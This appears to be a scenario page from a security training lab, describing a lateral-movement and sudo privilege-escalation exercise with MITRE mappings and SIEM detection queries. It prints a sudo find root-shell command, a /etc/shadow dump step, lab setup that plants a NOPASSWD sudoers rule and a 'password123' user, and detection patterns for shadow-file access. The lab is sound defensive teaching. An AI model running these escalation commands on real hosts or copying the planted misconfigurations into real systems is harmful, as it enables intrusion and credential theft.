# Incident 03 — Lateral Movement + Privilege Escalation

| | |
|---|---|
| **Status** | 🚧 In progress |
| **MITRE ATT&CK** | [T1046](https://attack.mitre.org/techniques/T1046/), [T1018](https://attack.mitre.org/techniques/T1018/), [T1021.004](https://attack.mitre.org/techniques/T1021/004/), [T1548.003](https://attack.mitre.org/techniques/T1548/003/), [T1003](https://attack.mitre.org/techniques/T1003/) |
| **Severity** | Critical — root on a second host + credential dump |
| **Difficulty** | Advanced |
| **Estimated duration** | ~3 h |
| **Missing** | Reproduction script (`attack/`), sample logs (`logs/`), detection rule (Wazuh/Elastic), queries in `detection/kibana_queries.md` (currently inline below), NIST incident report (`report/incident_report.md`). |

> Checklist: [definition of done](../../notes/scenario-definition-of-done.md)

## Scenario Overview

After gaining initial access on a low-privilege user account (from Incident 01 or 02), the attacker pivots through the internal network. They discover a second host, exploit a misconfigured sudo rule, escalate to root, and dump credentials from memory.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Discovery | Network Service Discovery | T1046 |
| Discovery | Remote System Discovery | T1018 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Sudo and Sudo Caching | T1548.003 |
| Credential Access | OS Credential Dumping | T1003 |

## Attack Flow

```
[Attacker on ubuntu-victim as john]
        ↓
[1] nmap internal scan → discovers 172.16.0.30 (second host)
        ↓
[2] SSH into 172.16.0.30 with reused credentials
        ↓
[3] sudo -l → finds misconfigured: NOPASSWD: /usr/bin/find
        ↓
[4] sudo find / -exec /bin/bash \; → root shell
        ↓
[5] cat /etc/shadow → dump password hashes
        ↓
[6] Exfiltrate hashes to attacker C2
```

## Sudo Misconfiguration (GTFOBins Exploit)

The victim has this in `/etc/sudoers` (intentionally misconfigured for the lab):
```
john ALL=(ALL) NOPASSWD: /usr/bin/find
```

This allows privilege escalation via:
```bash
sudo find / -exec /bin/bash -p \; -quit
# Now running as root
```

## What You'll Learn

- Internal network scanning and pivoting
- Detecting lateral movement in SIEM
- Identifying sudo misconfiguration as an attack vector
- Understanding GTFOBins techniques
- Credential dumping detection

## Lab Setup for This Scenario

```bash
# Add intentional sudo misconfiguration on victim
echo "john ALL=(ALL) NOPASSWD: /usr/bin/find" | sudo tee -a /etc/sudoers.d/john-lab

# Create second VM or use same VM with a second user
sudo useradd -m -s /bin/bash victim2
echo "victim2:password123" | sudo chpasswd
```

## Detection

```kql
# Detect nmap scan
message: "portscan" OR (message: "SYN" AND network.direction: "inbound" AND destination.port_range: "1-65535")

# Detect sudo abuse
program: "sudo" AND message: "/usr/bin/find"

# Detect shadow file access
message: "/etc/shadow" AND (program: "cat" OR program: "find")
```
